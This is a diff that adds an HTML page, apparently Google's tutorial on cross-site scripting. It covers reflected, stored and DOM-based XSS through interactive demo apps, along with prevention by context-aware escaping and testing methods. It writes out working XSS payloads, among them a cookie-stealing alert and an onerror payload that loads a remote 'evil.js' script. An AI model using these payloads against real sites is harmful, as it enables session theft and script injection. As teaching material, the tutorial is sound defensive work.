@@ -1,0 +1,834 @@
+<!DOCTYPE html>
+<html class="google mmfb" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <script src="//www.gstatic.com/safen-me-up.js"></script>
+    <script>
+    if (window.safenup_status !== 'ok') { document.write('<PLAINTEXT>'); }
+    </script>
+    <script>
+    (function(H){H.className=H.className.replace(/\bgoogle\b/,'google-js')})(document.documentElement)
+    </script>
+    <meta content="initial-scale=1, minimum-scale=1, width=device-width" name="viewport">
+    <title>
+      Cross-Site Scripting – Application Security – Google
+    </title>
+    <script src="//www.google.com/js/google.js"></script>
+    <script>
+    new gweb.analytics.AutoTrack({profile:"UA-51571019-1"});
+    </script>
+    <link href=
+    "//fonts.googleapis.com/css?family=Open+Sans:300,400,600,700|Product+Sans:400&amp;lang=en" rel=
+    "stylesheet">
+    <link href="/about/appsecurity/css/default.css" rel="stylesheet">
+    <title>
+      Introduction to XSS
+    </title>
+    <style type="text/css">
+    span.c3 {font-weight: bold; text-decoration: underline}
+    div.c2 {display: none;}
+    span.c1 {color: #007000;}
+    </style>
+  </head>
+  <body>
+    <div class="maia-header" id="maia-header" role="banner">
+      <div class="maia-aux">
+        <h1>
+          <a href="/"><img alt="Google" src=
+          "//www.google.com/images/branding/googlelogo/1x/googlelogo_color_116x41dp.png" srcset=
+          "//www.google.com/images/branding/googlelogo/2x/googlelogo_color_116x41dp.png 2x"></a>
+        </h1>
+        <h2>
+          <a href="/about/appsecurity/">&nbsp;Application Security</a>
+        </h2><a class="maia-teleport" href="#content">Skip to content</a>
+        <div class="maia-util">
+          <div class="maia-plusone">
+            <span class="plusone-button" id="plusone-"></span> 
+            <script>
+            window.___gcfg = {
+      lang: 'en',
+      parsetags: 'explicit'
+    };
+
+    var gweb = gweb || {};  // namespace
+    gweb.plusOneButton = {};
+    gweb.plusOneButton.callbacks = {};
+    gweb.plusOneButton.onPlusOneLoad = function() {
+      for (var slug in gweb.plusOneButton.callbacks) {
+        gapi.plusone.render(slug, gweb.plusOneButton.callbacks[slug]);
+      }
+      gweb.plusOneButton.callbacks = {};
+    };
+            </script> 
+            <script src="//apis.google.com/js/platform.js"></script> 
+            <script>
+            gweb.plusOneButton.callbacks['plusone-'] = {
+      'annotation': 'none',
+      'href': location.protocol + '//' + document.domain + location.pathname,
+      'size': 'standard',
+      'callback': '',
+      'recommendations': 'true'
+  };
+  gweb.plusOneButton.onPlusOneLoad();
+            </script>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="maia-nav" id="maia-nav-x" role="navigation">
+      <div class="maia-aux">
+        <ul>
+          <li>
+            <a href="../../../../about/appsecurity/">Home</a>
+          </li>
+          <li>Learning
+          </li>
+          <li>
+            <a href="../../../../about/appsecurity/programs-home/">Reward Programs</a>
+          </li>
+          <li>
+            <a href="../../../../about/appsecurity/hall-of-fame/">Hall of Fame</a>
+          </li>
+          <li>
+            <a href="../../../../about/appsecurity/research/">Research</a>
+          </li>
+        </ul>
+      </div>
+    </div>
+    <div id="maia-main" role="main">
+      <div class="maia-teleport" id="content"></div>
+      <script>
+      function addPostMessageListener() {
+    window.addEventListener("message", function(event){
+      event.data.toString().match(/\/demo\/(\d+)/);
+      var frameNum = RegExp.$1;
+      updateURLBar(frameNum, event.data);
+    }, false);
+  }
+  function updateURLBar(frameNum, value) {
+    if (value.match(/^https?:\/\//)) {
+      var urlbar = document.getElementById('input' + frameNum);
+      urlbar.value = unescape(value);
+    }
+  }
+  function populateURLBars() {
+    updateURLBar(2, document.getElementById('demo2').src);
+    updateURLBar(3, document.getElementById('demo3').src);
+  }
+  function updateFrame(frameNum, url) {
+    if (!url) {
+      var urlbar = document.getElementById('input' + frameNum);
+      url = urlbar.value;
+    }
+    if (url.match(/^https?:\/\/xss-doc\.appspot\.com\//)) {
+      var frame = document.getElementById('demo' + frameNum);
+      frame.src = url;
+      frame.contentWindow.postMessage(url, "*");
+    }
+  }
+  function setNewlineHandlers() {
+    document.getElementById('input2').onkeyup = function (e) {
+      if (e.keyCode == 13) {
+        updateFrame(2);
+      return false;
+      }
+    }
+    document.getElementById('input3').onkeyup = function (e) {
+      if (e.keyCode == 13) {
+        updateFrame(3);
+      return false;
+      }
+    }
+  }
+  function toggleSource(linkID, sourceID) {
+    if (document.getElementById(sourceID).style.display == "block") {
+      document.getElementById(linkID + "-link").textContent = "Click to view application source code";
+      document.getElementById(sourceID).style.display = "none";
+    } else {
+      document.getElementById(linkID + "-link").textContent = "Click to hide application source code";
+      document.getElementById(sourceID).style.display = "block";
+    }
+  }
+  window.onload = function() {
+    populateURLBars();
+    setNewlineHandlers();
+    addPostMessageListener();
+  }
+      </script>
+      <style>
+
+      .demo, .source { border: 1px solid rgb(102, 102, 102); width: 800px; height: 300px; margin-right: 10px; }
+      .demo-controls { background-color: #f4f4f4; border: 1px solid #f0f0f0; width: 642px; padding: 2px 3px; border: 1px solid #999; border-bottom: none; }
+      .demo-main, .demo-source { border: 1px solid rgb(102, 102, 102); width: 650px; height: 300px; margin-right: 10px; }
+      .demo-source { width: 650px; }
+      .demo-controls .url { display: inline-block; padding-right: 2px; font-family: serif; position: relative; bottom: -1px; }
+      .demo-controls .urlbutton { width: 40px; }
+      .demo-controls .urlbar { width: 545px; padding: 3px; border: 1px solid #666; font-family: monospace; }
+      code { color: #007000; font-family: Consolas, monospace; font-size: 10pt; }
+      </style>
+      <h1>
+        Cross-site scripting
+      </h1>
+      <h2>
+        Table of Contents
+      </h2>
+      <ul>
+        <li>
+          <a href="#Introduction">Introduction to cross-site scripting</a>
+          <ul>
+            <li>
+              <a href="#Audience">Target audience</a>
+            </li>
+            <li>
+              <a href="#WhatIsIt">What is cross-site scripting and why should I care?</a>
+            </li>
+            <li>
+              <a href="#BasicExample">A basic example</a>
+            </li>
+            <li>
+              <a href="#StoredXSS">Sometimes the XSS payload can persist</a>
+            </li>
+            <li>
+              <a href="#DomXSS">Your server won't always see the XSS payload</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a href="#PreventingXSS">Preventing XSS</a>
+          <ul>
+            <li>
+              <a href="#HowToPrevent">What can I do to prevent XSS?</a>
+            </li>
+            <li>
+              <a href="#TemplateSystems">Use a template system with context-aware auto-escaping</a>
+            </li>
+            <li>
+              <a href="#ManualEscape">A note on manually escaping input</a>
+            </li>
+            <li>
+              <a href="#Understand">Understand common browser behaviors that lead to XSS</a>
+            </li>
+            <li>
+              <a href="#Learn">Learn the best practices for your technology</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a href="#TestingXSS">Testing for XSS</a>
+          <ul>
+            <li>
+              <a href="#HowToTest">How can I test for XSS?</a>
+            </li>
+            <li>
+              <a href="#ManualTests">Manual testing ("black-box testing")</a>
+            </li>
+            <li>
+              <a href="#CodeReview">Code review ("white-box testing")</a>
+            </li>
+            <li>
+              <a href="#UnitTests">Unit tests</a>
+            </li>
+            <li>
+              <a href="#Scanners">Web application security scanners</a>
+            </li>
+            <li>
+              <a href="#WhichMethod">Which testing method should I use?</a>
+            </li>
+          </ul>
+        </li>
+      </ul><a id="Introduction" name="Introduction"></a>
+      <h1>
+        Introduction to cross-site scripting
+      </h1><a id="Audience" name="Audience"></a>
+      <h2>
+        Target Audience
+      </h2>
+      <p>
+        This document is intended for anyone who develops websites or is interested in web security
+        topics. A background in HTML, JavaScript, and Document Object Model (DOM) would be helpful
+        for some of the more technical details. <a id="BeGood" name="BeGood"></a>
+      </p>
+      <h2>
+        Don't be evil
+      </h2>
+      <p>
+        This document provides information that could be used to assess the security of a website
+        against cross-site scripting vulnerabilities. <b>Do not use what you learn here to test (or
+        worse, attack) websites without permission from the website's owner.</b> <a id="WhatIsIt"
+        name="WhatIsIt"></a>
+      </p>
+      <h2>
+        What is cross-site scripting and why should I care?
+      </h2>
+      <p>
+        Cross-site scripting (XSS) is a security bug that can affect websites. If present in your
+        website, this bug can allow an attacker to add their own malicious JavaScript code onto the
+        HTML pages displayed to your users. Once executed by the victim's browser, this code could
+        then perform actions such as completely changing the behavior or appearance of the website,
+        stealing private data, or performing actions on behalf of the user.
+      </p>
+      <p>
+        Don't worry, we'll show you what all this means, but before we dig deeper, let's take a
+        look at some interactive examples to see how it works. <a id="BasicExample" name=
+        "BasicExample"></a>
+      </p>
+      <h2>
+        A basic example
+      </h2>
+      <p>
+        XSS vulnerabilities most often happen when user input is incorporated into a web server's
+        response (i.e., an HTML page) without proper escaping or validation.
+      </p>
+      <p>
+        Consider the search application below. Click on "<span class="c1">Show demo</span>" to load
+        the application. This is a working demo application; so, you can interact with it--try
+        searching for something. For your reference, we also included the App Engine source
+        code--you can view the code by clicking on "<span class="c1">Click to view application
+        source code</span>" link.
+      </p>
+      <p>
+        <b>Demo application 1:</b>
+      </p>
+      <div class="demo-controls">
+        <span class="url">URL</span> <input class="urlbar" id="input2" type="text" value="">
+        <input class="urlbutton" onclick="updateFrame(2); return false;" type="submit" value="Go">
+      </div><iframe border="0" class="demo-main" id="demo2" name="demo2" src=
+      "data:text/html,%3Ca%20href='https://xss-doc.appspot.com/demo/2'%20style='font-size:%2024px;%20color:%20black;%20width:%20100%;%20text-align:%20center;%20display:%20block;%20margin-top:%20120px;'%3EShow%20demo%3C/a%3E"></iframe><br>
+
+      <div id="toggleDemo2">
+        <p>
+          <a href="javascript:toggleSource('toggleDemo2',%20'demo2-source');" id=
+          "toggleDemo2-link">Click to view application source code</a>
+        </p>
+      </div>
+      <div class="c2" id="demo2-source">
+        <iframe border="0" class="demo-source" src=
+        "https://xss-doc.appspot.com/demo/2/source"></iframe>
+      </div>
+      <p>
+        Using the demo application above, search for <code>test</code>. This returns the following
+        output:
+      </p><span class="c1">Sorry, no results were found for <b><span class="c1">test</span></b>.
+      Try again.</span>
+      <p>
+        Now, search for <code>&lt;u&gt;test&lt;/u&gt;</code>. Notice that "test" is underlined in
+        the response:
+      </p><span class="c1">Sorry, no results were found for <span class="c3"><span class=
+      "c1">test</span></span>. Try again.</span>
+      <p>
+        So, without looking at the code, it seems that the application includes our own HTML markup
+        in the response. That's interesting but not terribly dangerous. If, however, the
+        application also allows us to inject JavaScript code, that would be much more
+        "interesting".
+      </p>
+      <p>
+        Let's give it a try. Search for <code>&lt;script&gt;alert('hello')&lt;/script&gt;</code>.
+      </p>
+      <p>
+        We found an XSS bug!
+      </p>
+      <p>
+        You've just experienced a "reflected" XSS attack, where the JavaScript payload
+        (<code>&lt;script&gt;alert('hello')&lt;/script&gt;</code>) is echoed back on the page
+        returned by the server.
+      </p>
+      <p>
+        If you look at line 50 of the source code, you'll see that the message that is displayed in
+        the search results page is a string that's constructed using the <code>query</code> input
+        value. This string is then passed to a function that renders the HTML output using the
+        <code>response.out.write</code> method in line 37. The problem is that the input is not
+        escaped before it's rendered. We'll discuss escaping later in the "Preventing XSS" section.
+      </p>
+      <p>
+        In the above scenario, an attacker would need the victim to either:
+      </p>
+      <ul>
+        <li>Visit any page controlled by the attacker. This page might include an invisible iframe
+        that points to the site that's vulnerable to XSS, along with a payload to exploit the
+        vulnerability.
+        </li>
+        <li>Or click on a URL link from the attacker. This link would include the exploit payload
+        (in the example above, <span class=
+        "c1">https://xss-doc.appspot.com/demo/2?query=&lt;script&gt;alert('hello')&lt;/script&gt;</span>)
+        and may even be obscured by a URL shortener.
+        </li>
+      </ul>
+      <p>
+        It's worth noting that an XSS payload can be delivered in different ways; for example, it
+        could be in a parameter of an HTTP POST request, as part of the URL, or even within the web
+        browser cookie - basically, anywhere a user can supply input to the website.
+      </p>
+      <p>
+        All this to generate an annoying pop-up window might not seem worth it. Unfortunately, XSS
+        vulnerabilities can result in much more than alerts on a page (a pop-up alert is just a
+        convenient way for an attacker or researcher to detect the presence of an XSS bug). Take a
+        look at the next example for a more malicious script. <a id="StoredXSS" name=
+        "StoredXSS"></a>
+      </p>
+      <h2>
+        Sometimes the XSS payload can persist
+      </h2>
+      <p>
+        In the attack we described above, the web server echoes back the XSS payload to the victim
+        right away. But it is also possible for the server to store the attacker-supplied input
+        (the XSS payload) and serve it to the victim at a later time. This is called a "stored
+        XSS".
+      </p>
+      <p>
+        Below we illustrate a basic example using a demo social networking site. Go ahead, enter
+        some text and share your status in the demo application below.
+      </p>
+      <p>
+        <b>Demo application 2:</b>
+      </p><iframe border="0" class="demo-main" id="demo1" name="demo1" src=
+      "data:text/html,%3Ca%20href='https://xss-doc.appspot.com/demo/1'%20style='font-size:%2024px;%20color:%20black;%20width:%20100%;%20text-align:%20center;%20display:%20block;%20margin-top:%20120px;'%3EShow%20demo%3C/a%3E"></iframe><br>
+
+      <div id="toggleDemo1">
+        <p>
+          <a href="javascript:toggleSource('toggleDemo1',%20'demo1-source');" id=
+          "toggleDemo1-link">Click to view application source code</a>
+        </p>
+      </div>
+      <div class="c2" id="demo1-source">
+        <iframe border="0" class="demo-source" src=
+        "https://xss-doc.appspot.com/demo/1/source"></iframe>
+      </div>
+      <p>
+        Next, try this:
+      </p>
+      <ol>
+        <li>Enter <code>&lt;img src=x onerror="alert('Pop-up window via stored XSS');"</code>
+        </li>
+        <li>Share your status.
+        </li>
+        <li>You should see a pop-up alert! You'll see the alert again if you refresh the page or
+        share another status message.
+        </li>
+      </ol>
+      <p>
+        Now, enter <code>&lt;img src=x onerror="alert(document.cookie);"</code> and hit
+        '<span class="c1">Share status!</span>'.
+      </p>
+      <p>
+        The session ID for this application (a contrived one that is probably '<span class=
+        "c1">123412341234</span>') will pop up! An attacker could use XSS exploit code to collect
+        this session ID, and try to impersonate the owner of the account.
+      </p>
+      <p>
+        Note: To reset the application and get rid of the annoying pop-ups, click the "<span class=
+        "c1">Clear all posts</span>" button.
+      </p>
+      <p>
+        What else can you do besides popping up alerts or stealing session IDs? You can pretty much
+        do anything JavaScript allows. Try entering the following:
+      </p><code>&lt;img src=1
+      onerror="s=document.createElement('script');s.src='//xss-doc.appspot.com/static/evil.js';document.body.appendChild(s);"</code>
+      <p>
+        Spooky, huh? In this example, an evil JavaScript file was retrieved and embedded via XSS.
+        <a id="DomXSS" name="DomXSS"></a>
+      </p>
+      <h2>
+        Your server won't always see the XSS payload
+      </h2>
+      <p>
+        In the previous two examples, user input was sent to the server, and the server responded
+        back to the user by displaying a page that included the user input. However, a stored or
+        reflected XSS vulnerability can also occur without direct involvement of the server, if
+        user-supplied data is used in an unsafe JavaScript operation. That is, the XSS can occur
+        entirely in the client-side JavaScript and HTML (more specifically, in the Document Object
+        Model or DOM) without data being sent back and forth between the client and the server. We
+        call this subclass of bugs "DOM-based XSS" or "DOM XSS" for short. A common cause of DOM
+        XSS bugs is setting the <code>innerHTML</code> value of a DOM element with user-supplied
+        data.
+      </p>
+      <p>
+        Take a look at the following application. It uses a URL fragment to determine which tab to
+        show.
+      </p>
+      <p>
+        <b>Demo application 3:</b>
+      </p>
+      <div class="demo-controls">
+        <span class="url">URL</span> <input class="urlbar" id="input3" type="text" value="">
+        <input class="urlbutton" onclick="updateFrame(3); return false;" type="submit" value="Go">
+      </div><iframe border="0" class="demo-main" id="demo3" name="demo3" src=
+      "data:text/html,%3Ca%20href='https://xss-doc.appspot.com/demo/3'%20style='font-size:%2024px;%20color:%20black;%20width:%20100%;%20text-align:%20center;%20display:%20block;%20margin-top:%20120px;'%3EShow%20demo%3C/a%3E"></iframe><br>
+
+      <div id="toggleDemo3">
+        <p>
+          <a href="javascript:toggleSource('toggleDemo3',%20'demo3-source');" id=
+          "toggleDemo3-link">Click to view application source code</a>
+        </p>
+      </div>
+      <div class="c2" id="demo3-source">
+        <iframe border="0" class="demo-source" src=
+        "https://xss-doc.appspot.com/demo/3/source"></iframe>
+      </div>
+      <p>
+        The application works as expected when you click on the tabs. However, it is also possible
+        to open a URL such as:
+      </p><span class="c1">https://xss-doc.appspot.com/demo/3#'&gt;&lt;img src=x
+      onerror=alert(/DOM-XSS/)&gt;</span>
+      <p>
+        You can copy and paste the above URL into the "URL bar" in the demo application above and
+        click the "<span class="c1">Go</span>" button. You should see a pop-up alert.
+      </p>
+      <p>
+        The XSS is triggered because the client-side script uses part of the
+        <code>window.location</code> to set the <code>innerHTML</code> of one of the elements
+        inside the page. When you go to the above URL, the <code>location.hash</code> variable is
+        set to <code>#'&gt;&lt;img src=x onerror=alert(/DOM-XSS/)&gt;</code>. If you look at line
+        33 of the source code for index.html, you will see that the substring of
+        <code>location.hash</code> (the string after the <span class="c1">#</span> character) is
+        passed as the argument to the <code>chooseTab</code> function in line 8.
+        <code>chooseTab</code> constructs an img element for embedding an image using the
+        following:
+      </p><code>html += "&lt;img src='/static/demos/GEECS" + name + ".jpg' /&gt;";</code>
+      <p>
+        The <code>location.hash</code> substring argument is used to set the value of
+        <code>name</code>; this results in following img element:
+      </p><code>&lt;img src='/static/demos/GEECS'&gt;&lt;img src=x
+      onerror=alert(/DOM-XSS/)&gt;.jpg' /&gt;</code>
+      <p>
+        The above is valid HTML; however, the browser will fail to load the image and will instead
+        execute the <code>onerror</code> code. This img element is ultimately added to the document
+        via <code>innerHTML</code> on line 12. <a id="PreventingXSS" name="PreventingXSS"></a>
+      </p>
+      <h1>
+        Preventing XSS
+      </h1><a id="NotFoolproof" name="NotFoolproof"></a>
+      <h2>
+        Nothing is foolproof
+      </h2>
+      <p>
+        We provide some suggestions on how you can minimize the chance that your website will
+        contain XSS vulnerabilities. But keep in mind that both security and technology evolves
+        very rapidly; so, no guarantees--what works today may not fully work tomorrow (hackers can
+        be pretty clever). <a id="HowToPrevent" name="HowToPrevent"></a>
+      </p>
+      <h2>
+        What can I do to prevent XSS?
+      </h2>
+      <p>
+        A common technique for preventing XSS vulnerabilities is "escaping". The purpose of
+        character and string escaping is to make sure that every part of a string is interpreted as
+        a string primitive, not as a control character or code.
+      </p>
+      <p>
+        For example, '<code>&amp;lt;</code>' is the HTML encoding for the '<code>&lt;</code>'
+        character. If you include:
+      </p><code><b><span class="c1">&lt;</span></b>script<b><span class=
+      "c1">&gt;</span></b>alert('testing')<b><span class="c1">&lt;</span></b>/script<b><span class=
+      "c1">&gt;</span></b></code>
+      <p>
+        in the HTML of a page, the script will execute. But if you include:
+      </p><code><b><span class="c1">&amp;lt;</span></b>script<b><span class=
+      "c1">&amp;gt;</span></b>alert('testing')<b><span class=
+      "c1">&amp;lt;</span></b>/script<b><span class="c1">&amp;gt;</span></b></code>
+      <p>
+        in the HTML of a page, it will print out the text <span class=
+        "c1">"&lt;script&gt;alert('testing')&lt;/script&gt;</span>", but it will not actually
+        execute the script. By escaping the <code>&lt;script&gt;</code> tags, we prevented the
+        script from executing. Technically, what we did here is "encoding" not "escaping", but
+        "escaping" conveys the basic concept (and we'll see later that in the case of JavaScript,
+        "escaping" actually is the correct term).
+      </p>
+      <p>
+        The following can help minimize the chances that your website will contain XSS
+        vulnerabilities:
+      </p>
+      <ul>
+        <li>Using a template system with context-aware auto-escaping
+        </li>
+        <li>Manually escaping user input (if it’s not possible to use a template system with
+        context-aware auto-escaping)
+        </li>
+        <li>Understanding common browser behaviors that lead to XSS
+        </li>
+        <li>Learning the best practices for your technology
+        </li>
+      </ul>
+      <p>
+        The rest of this section describes these measures in detail. <a id="TemplateSystems" name=
+        "TemplateSystems"></a>
+      </p>
+      <h2>
+        Use a template system with context-aware auto-escaping
+      </h2>
+      <p>
+        The simplest and best means to protect your application and your users from XSS bugs is to
+        use a <a href="https://en.wikipedia.org/wiki/Web_template_system">web template system</a>
+        or <a href="https://en.wikipedia.org/wiki/Web_application_framework">web application
+        development framework</a> that auto-escapes output and is context-aware.
+      </p>
+      <p>
+        "Auto-escaping" refers to the ability of a template system or web development framework to
+        automatically escape user input in order to prevent any scripts embedded in the input from
+        executing. If you wanted to prevent XSS without auto-escaping, you would have to manually
+        escape input; this means writing your own custom code (or call an escape function)
+        everywhere your application includes user-controlled data. In most cases, manually escaping
+        input is not recommended; we'll discuss manual escaping in the next section.
+      </p>
+      <p>
+        "Context-aware" refers to the ability to apply different forms of escaping based on the
+        appropriate context. Because CSS, HTML, URLs, and JavaScript all use different syntax,
+        different forms of escaping are required for each context. The following example HTML
+        template uses variables in all of these different contexts:
+      </p>
+      <pre><code>
+&lt;body&gt;
+  &lt;span style="color:{{ USER_COLOR }};"&gt;
+    Hello {{ USERNAME }}, view your &lt;a href="{{ USER_ACCOUNT_URL }}"&gt;Account&lt;/a&gt;.
+  &lt;/span&gt;
+  &lt;script&gt;
+    var id = {{ USER_ID }};
+    alert("Your user ID is: " + id);
+  &lt;/script&gt;
+&lt;/body&gt;
+</code></pre>
+      <p>
+        As you can see, trying to manually escape input for various contexts can be very difficult.
+        You can read more about context-aware auto-escaping <a href=
+        "http://googleonlinesecurity.blogspot.com/2009/03/reducing-xss-by-way-of-automatic.html">here</a>.
+        <a href="https://code.google.com/p/go/source/browse/src/pkg/html/template/doc.go">Go
+        Templates</a>, <a href=
+        "http://www.gwtproject.org/doc/latest/DevGuideSecuritySafeHtml.html">Google Web Toolkit
+        (GWT) with SafeHtml</a>, <a href=
+        "https://developers.google.com/closure/templates/docs/security">Closure Templates</a>, and
+        <a href="https://code.google.com/p/ctemplate/">CTemplate</a> all provide context-aware
+        auto-escaping so that variables are correctly escaped for the page context in which they
+        appear. If you are using templates to generate HTML within JavaScript (a good idea!)
+        <a href="https://developers.google.com/closure/templates/docs/security">Closure
+        Templates</a> and <a href="https://docs.angularjs.org/misc/faq">Angular</a> provide
+        built-in escaping capabilities. <a id="ManualEscape" name="ManualEscape"></a>
+      </p>
+      <h2>
+        A note on manually escaping input
+      </h2>
+      <p>
+        Writing your own code for escaping input and then properly and consistently applying it is
+        extremely difficult. We do not recommend that you manually escape user-supplied data.
+        Instead, we <b>strongly</b> recommend that you use a templating system or web development
+        framework that provides context-aware auto-escaping. If this is impossible for your
+        website, use existing libraries and functions that are known to work, and apply these
+        functions consistently to all user-supplied data and all data that isn't directly under
+        your control. <a id="Understand" name="Understand"></a>
+      </p>
+      <h2>
+        Understand common browser behaviors that lead to XSS
+      </h2>
+      <p>
+        If you follow the practices from the previous section, you can reduce your risk of
+        introducing XSS bugs into your applications. There are, however, more subtle ways in which
+        XSS can surface. To mitigate the risk of these corner cases, consider the following:
+      </p>
+      <ul>
+        <li>Specify the correct <code>Content-Type</code> and <code>charset</code> for all
+        responses that can contain user data.
+          <ul>
+            <li>Without such headers, many browsers will try to automatically determine the
+            appropriate response by performing <a href=
+            "https://code.google.com/p/browsersec/wiki/Part2#Content_handling_mechanisms">content
+            or character set sniffing</a>. This may allow external input to fool the browser into
+            interpreting part of the response as HTML markup, which in turn can lead to XSS.
+            </li>
+          </ul>
+        </li>
+        <li>Make sure all user-supplied URLs start with a safe protocol.
+          <ul>
+            <li>It's often necessary to use URLs provided by users, for example as a continue URL
+            to redirect after a certain action, or in a link to a user-specified resource. If the
+            protocol of the URL is controlled by the user, the browser can interpret it as a
+            scripting URI (e.g. <code>javascript:</code>, <code>data:</code>, and others) and
+            execute it. To prevent this, always verify that the URL begins with a whitelisted value
+            (usually only <code>http://</code> or <code>https://</code>).
+            </li>
+          </ul>
+        </li>
+        <li>Host user-uploaded files in a sandboxed domain.
+        </li>
+      </ul><a id="Learn" name="Learn"></a>
+      <h2>
+        Learn the best practices for your technology
+      </h2>
+      <p>
+        The following best practices can help you reduce XSS vulnerabilities in your code for
+        specific technologies.
+      </p>
+      <ul>
+        <li>
+          <b>JavaScript</b>: Many XSS vulnerabilities are caused by passing user data to Javascript
+          <i>execution sinks</i>; browser mechanisms that will execute scripts from their input.
+          Such APIs include <code>*.innerHTML</code>, <code>document.write</code> and
+          <code>eval()</code>. When user-controlled data (in the form of <code>location.*</code>,
+          <code>document.cookie</code> or JavaScript variables containing user data) is returned by
+          the server, calling such functions can lead to XSS.
+        </li>
+        <li>
+          <b>JSON</b>: Make sure you apply proper escaping (including HTML-escaping of characters
+          such as <code>&lt;</code> and <code>&gt;</code>). Do not allow user-supplied data to be
+          returned as the first part of the response (as often happens in JSONP). Do not use
+          <code>eval()</code> to parse the data.
+        </li>
+        <li>
+          <b>Flash</b>: Consider hosting SWF files in a separate domain.
+        </li>
+        <li>
+          <b>GWT</b>: Follow the guidelines in the <a href=
+          "http://www.gwtproject.org/doc/latest/DevGuideSecuritySafeHtml.html">GWT Developer's
+          Guide on SafeHtml</a>. In particular, avoid the use of APIs that interpret plain
+          String-typed values as HTML and prefer the SafeHtml-variants where available. For
+          example, prefer <code>HTML#setHTML(SafeHtml)</code> over
+          <code>HTML#setHTML(String)</code>.
+        </li>
+        <li>
+          <b>HTML sanitization</b>: If you need to support user-supplied markup such as images or
+          links, look for technologies that support HTML sanitization. For example, Caja includes
+          an <a href=
+          "https://code.google.com/p/google-caja/wiki/JsHtmlSanitizer">html-sanitizer</a> written
+          in Javascript that can be used to remove potentially executable Javascript from a snippet
+          of HTML.
+        </li>
+      </ul><a id="TestingXSS" name="TestingXSS"></a>
+      <h1>
+        Testing for XSS
+      </h1><a id="Caution" name="Caution"></a>
+      <h2>
+        Proceed with caution
+      </h2>
+      <p>
+        As with any security testing, there may be unintended side-effects. We assume no
+        responsibility for your use of the knowledge you obtain here (with power comes
+        responsibility); so, use this information at your own risk. <a id="HowToTest" name=
+        "HowToTest"></a>
+      </p>
+      <h2>
+        How can I test for XSS?
+      </h2>
+      <p>
+        There is no silver bullet for detecting XSS in applications. The best way to go about
+        testing for XSS bugs is through a combination of:
+      </p>
+      <ul>
+        <li>manual testing,
+        </li>
+        <li>writing unit tests to verify correct escaping or sanitization in crucial parts of your
+        application, and
+        </li>
+        <li>using automated tools.
+        </li>
+      </ul>
+      <p>
+        This section will describe and make recommendations for each strategy. <a id="ManualTests"
+        name="ManualTests"></a>
+      </p>
+      <h2>
+        Manual testing ("black-box testing")
+      </h2>
+      <p>
+        XSS is a risk wherever your application handles user input.
+      </p>
+      <p>
+        For best results, configure your browser to use a proxy that intercepts and scans traffic
+        to help identify problems. Example tools include <a href=
+        "http://portswigger.net/burp/proxy.html">Burp Proxy</a> and <a href=
+        "https://code.google.com/p/ratproxy/">ratproxy</a>.
+      </p>
+      <p>
+        Perform these basic tests on your application:
+      </p>
+      <ul>
+        <li>Interact with your application. Insert strings that contain HTML and JavaScript
+        metacharacters into all application inputs, such as forms, URL parameters, hidden
+        fields(!), or cookie values.
+        </li>
+        <li>A good test string is <code>&gt;'&gt;"&gt;&lt;img src=x onerror=alert(0)&gt;</code>.
+        </li>
+        <li>If your application doesn't correctly escape this string, you will see an alert and
+        will know that something went wrong.
+        </li>
+        <li>Wherever your application handles user-supplied URLs, enter
+        <code>javascript:alert(0)</code> or
+        <code>data:text/html,&lt;script&gt;alert(0)&lt;/script&gt;</code>.
+        </li>
+        <li>Create a test user profile with data similar to the test strings above. Use that
+        profile to interact with your application. This can help identify stored XSS bugs.
+        </li>
+      </ul><a id="CodeReview" name="CodeReview"></a>
+      <h2>
+        Code review ("white-box testing")
+      </h2>
+      <p>
+        Request that a colleague or friend review your code with fresh eyes (and offer to return
+        the favor!). Ask them to specifically look for XSS vulnerabilities and point them to this
+        document, if it would be helpful. <a id="UnitTests" name="UnitTests"></a>
+      </p>
+      <h2>
+        Unit tests
+      </h2>
+      <p>
+        Use unit testing to make sure that a particular bit of data is correctly escaped. While
+        it's not always feasible to <a href="https://en.wikipedia.org/wiki/Unit_testing">unit
+        test</a> every place where user-supplied data is displayed, you should at a minimum write
+        unit tests for any slightly out of the ordinary code to make sure that the result meets
+        your expectations. This includes places where:
+      </p>
+      <ul>
+        <li>Markup that includes user input is generated in the code - verify that any untrusted
+        input is escaped or removed.
+        </li>
+        <li>Your application redirects to external URLs - make sure that the URL begins with
+        <span class="c1">http://</span> or <span class="c1">https://</span>.
+        </li>
+        <li>You use an HTML sanitizer or stripper to remove tags from the markup - verify that any
+        unsupported markup is escaped.
+        </li>
+      </ul>
+      <p>
+        Also, any time after you find and fix an XSS bug in your code, consider adding a regression
+        test for it. <a id="Scanners" name="Scanners"></a>
+      </p>
+      <h2>
+        Web application security scanners
+      </h2>
+      <p>
+        You can use security scanning software to identify XSS vulnerabilities within applications.
+        While automatic scanners are often not optimized for your particular application, they
+        allow you to quickly and easily find the more obvious vulnerabilities. <a href=
+        "https://code.google.com/p/skipfish/">Skipfish</a> is one such tool. <a id="WhichMethod"
+        name="WhichMethod"></a>
+      </p>
+      <h2>
+        Which testing method should I use?
+      </h2>
+      <p>
+        Well, to be honest–as many of them as possible (what kind of response did you expect from
+        security people?). No testing methodology is foolproof; so, performing a combination of
+        code reviews, and manual and automated testing, will decrease the odds of a XSS
+        vulnerability in your application.
+      </p>
+    </div>
+    <div id="maia-signature"></div>
+    <div class="maia-footer" id="maia-footer">
+      <div id="maia-footer-global">
+        <div class="maia-aux">
+          <ul>
+            <li>
+              <a href="/">Google</a>
+            </li>
+            <li>
+              <a href="/intl/en/about/">About Google</a>
+            </li>
+            <li>
+              <a href="/intl/en/policies/privacy/">Privacy</a>
+            </li>
+            <li>
+              <a href="/intl/en/policies/terms/">Terms</a>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <script src="//www.google.com/js/maia.js"></script>
+  </body>
+</html>
